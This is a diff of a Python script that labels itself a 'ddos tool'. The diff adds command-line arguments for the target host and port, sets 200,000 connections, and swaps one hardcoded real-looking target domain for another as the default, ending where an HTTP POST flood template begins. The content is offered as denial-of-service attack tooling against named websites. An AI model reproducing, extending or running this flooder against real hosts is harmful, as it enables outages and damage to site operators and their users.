@@ -2,12 +2,26 @@
 import socket
 import time
 import threading
+import sys
 
 # Pressure Test,ddos tool
 # ---------------------------
+
+argv = sys.argv
+if len(argv) >= 2:
+    host = argv[-2]
+    if len(argv) == 3:
+        port = argv[-1]
+    else:
+        port = 80
+else:
+    # raise ValueError('缺少域名/IP参数')
+    host = 'xm.erert.cn'
+    port = 80
+
 MAX_CONN = 200000
-PORT = 80
-HOST = "chinasummer.org"
+PORT = port
+HOST = host
 PAGE = "/"
 # ---------------------------
 buf = ("POST %s HTTP/1.1\r\n"
